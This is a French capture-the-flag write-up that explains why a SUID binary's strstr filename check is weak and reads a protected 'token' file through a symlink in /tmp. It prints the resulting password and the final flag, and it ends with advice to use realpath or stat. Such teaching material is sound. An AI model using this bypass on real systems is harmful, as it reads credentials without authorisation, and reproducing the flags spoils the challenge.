# Level 08

## 📋 Informations

- **Domaine** : Contournement de filtre (Symlink)
- **Objectif** : Lire le fichier protégé `token` en trompant la vérification du nom de fichier effectuée par le binaire SUID.

---

## 🔍 Exploration

Nous trouvons un binaire `level08` et un fichier `token`.

```bash
ls -l
```

```text
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Le fichier `token` appartient à `flag08` et n'est lisible que par lui. Le binaire `level08` est SUID `flag08`, c'est donc lui qu'il faut utiliser pour lire le token.

---

## 🛠️ Analyse

Décompilons le binaire pour comprendre comment il fonctionne.

```c title:level08.c
int main(int argc, char **argv) {
    char *filename = argv[1];
    char buf[1024];
    
    if (argc == 1) {
        printf("%s [file to read]\n", argv[0]);
        exit(1);
    }
    
    // Vérification de sécurité
    if (strstr(filename, "token") != NULL) {
        printf("You may not access '%s'\n", filename);
        exit(1);
    }
    
    int fd = open(filename, 0);
    if (fd == -1) {
        err(1, "Unable to open %s", filename);
    }
    
    int n = read(fd, buf, 1024);
    write(1, buf, n);
    
    return 0;
}
```

> [!NOTE]
> **La protection**
> Le programme utilise `strstr` pour vérifier si la chaîne de caractères "token" est présente dans le nom du fichier passé en argument.
> Si "token" est trouvé (ex: `./level08 token`), le programme s'arrête avec le message `You may not access ...`.

> [!IMPORTANT]
> **La faille**
> La vérification porte uniquement sur le **nom** du fichier fourni en argument, pas sur le fichier réel qui sera ouvert.
> La fonction `open()` (et le système de fichiers Linux) suit les liens symboliques.
> Si nous créons un lien avec un nom différent qui pointe vers `token`, nous passerons le filtre `strstr` (car le nom ne contient pas "token"), mais `open` ouvrira bien le fichier cible.

---

## 🔓 Résolution

### 1. Création d'un lien symbolique
Nous allons créer un lien symbolique vers le fichier `token`, mais avec un nom inoffensif (ex: `soluce`).
On le place dans `/tmp` car nous avons les droits d'écriture.

```bash
ln -s /home/user/level08/token /tmp/soluce
```

### 2. Exécution
Nous lançons le programme en lui donnant notre lien symbolique comme argument.

```bash
./level08 /tmp/soluce
```

### 3. Résultat
Le binaire lit le fichier pointé par le lien et nous affiche son contenu (le mot de passe pour `flag08`).

```text
quif5eloekouj29ke0vouxean
```

Une fois connecté en tant que `flag08` :
```bash
getflag
```

**Flag Final :**
```text
25749xKZ8L7DkSCwJkT9dyv6f
```

---

## 📚 Notions utiles

- **Liens Symboliques (Symlinks)** : Fichiers qui servent de référence à un autre fichier ou dossier (comparable aux raccourcis).
- **TOCTOU / File Name Check** : Se baser uniquement sur le nom de fichier pour la sécurité est vulnérable. Il faudrait utiliser des chemins canoniques (`realpath`) ou vérifier les métadonnées de fichier (`stat`) avant l'ouverture.